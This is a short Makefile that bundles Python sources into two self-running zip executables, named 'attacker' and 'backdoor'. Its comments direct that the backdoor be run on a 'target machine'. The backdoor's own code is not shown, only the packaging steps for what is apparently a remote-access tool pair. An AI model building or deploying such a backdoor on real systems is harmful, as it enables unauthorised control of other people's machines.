all: attacker.zip backdoor.zip

# creates attacker executable file, make sure to run chmod +x attacker on attacker machine
attacker.zip:
	zip -j attacker.zip ./attacker_folder/__main__.py config.py socket_with_buffer.py
	echo '#!/usr/bin/env python' | cat - attacker.zip > attacker
 
# creates backdoor executable file, make sure to run chmod +x backdoor on target machine
backdoor.zip:
	zip -j backdoor.zip ./backdoor_folder/__main__.py config.py socket_with_buffer.py
	echo '#!/usr/bin/env python' | cat - backdoor.zip > backdoor

clean:
	rm *.zip
	rm attacker
	rm backdoor